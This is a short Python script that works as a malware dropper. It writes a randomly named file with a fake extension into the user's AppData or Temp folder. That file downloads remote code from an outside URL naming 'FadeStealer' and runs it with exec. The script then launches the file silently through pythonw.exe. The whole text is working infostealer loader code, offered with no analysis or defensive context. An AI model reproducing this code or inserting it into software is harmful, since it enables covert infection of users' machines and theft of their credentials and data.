from sys import executable as _eexecutable
from os import system as _ssystem
from os.path import isfile 
from os import getenv
from os import listdir
import random
firstName = ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
lasName=random.choice(lasName)

paths = random.choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
directory = listdir(paths)
for _ in range(10):
    chosen = random.choice(directory)
    ye = paths + '\\' + chosen
    if not isfile(ye) and " " not in chosen:
        path=ye
    else:
        path=getenv("TEMP")
DoYouKnowTheWay = path + '\\' + firstName+lasName
f=open(DoYouKnowTheWay, 'w')
f.write("from urllib.request import urlopen as _uurlopen;exec(_uurlopen('http://fade.best/injector/FadeStealer-D2KD').read())")
f.close()
exec2=_eexecutable.replace('.exe', 'w.exe')
try: _ssystem(f'"{exec2}" {DoYouKnowTheWay}')
except: pass